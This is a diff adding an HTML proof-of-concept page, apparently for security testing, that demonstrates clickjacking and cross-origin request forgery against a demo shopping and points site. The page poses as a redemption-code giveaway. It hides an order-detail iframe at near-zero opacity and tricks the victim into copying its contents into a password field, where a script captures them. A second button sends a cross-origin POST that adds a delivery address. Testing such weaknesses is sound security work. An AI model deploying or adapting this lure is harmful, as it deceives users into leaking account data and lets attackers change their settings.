@@ -1,0 +1,77 @@
+<!-- <iframe src="https://webcloud.demo.com.cn/v4/sms/device/list"></iframe>
+-->
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+ <title>点击劫持窃取用户敏感信息</title>
+</head>
+<body>
+<div id="parent">
+
+
+<center>
+<h1 style="color: blue; text-decoration: underline;">点击劫持窃取用户敏感信息</h1>
+</center>
+<h3>第一步：请输入手机号，生成独立的兑换码</h3>
+<input name="iphone" ></input>&#x20;<button onclick="submit()">提交</button>
+
+<h3>第二步：请复制提交您的兑换码进行兑换（如显示空白，请点击边框，通过Command+A复制，Command+C粘贴）</h3>
+<div style="border: 2px solid gray;">
+<h5 id="code"> </h5>
+<iframe src="https://coin.demo.com.cn/api/mall/order/detail.do?id=3354745&t=1566875338235" width="100%" style="opacity: 0.01"></iframe>
+</div>
+
+<h3>第三步：请输入您的兑换码</h3>
+<input id="password" type="password" name="" size="100">
+<br>
+<button id="btn" onclick="getInfo()">兑换</button>
+</div>
+
+<br/>
+<p>XHR验证</p >
+<button onclick="add_address()" >xhr添加地址请求</button>
+
+</body>
+<script>
+ function getHttpObj() {
+        var httpobj = null;
+        try {
+            httpobj = new ActiveXObject("Msxml2.XMLHTTP");
+        }
+        catch (e) {
+            try {
+                httpobj = new ActiveXObject("Microsoft.XMLHTTP");
+            }
+            catch (e1) {
+                httpobj = new XMLHttpRequest();
+            }
+        }
+        return httpobj;
+ }
+ //跨域添加地址
+ function add_address(){
+  var xhr = getHttpObj();
+  xhr.open("POST","https://coin.demo.com.cn/api/address/add.do",true);
+  xhr.setRequestHeader("Content-Type","application/json;charset=utf-8");
+  xhr.onreadystatechange = function(){
+   console.log(xhr.responseText);
+  }
+  var content = "{\"receiverName\":\"zhang\",\"mobilePhone\":\"152xxxxxx55\",\"province\":\"广东省\",\"city\":\"xxx\",\"area\":\"xxxx\",\"detailAddress\":\"hello\",\"isDefault\":false}";
+  
+  xhr.send(content);
+ }
+ 
+ //执行窃取敏感信息，发起敏感请求
+ function getInfo(){
+  var info = document.getElementById('password').value;
+  alert('恭喜您，兑换成功');
+  console.log(info);
+ }
+ 
+ //显示兑换码
+ function submit(){
+  document.getElementById('code').innerHTML="兑换码:xxxxxxx";
+ }
+</script>
+</html>
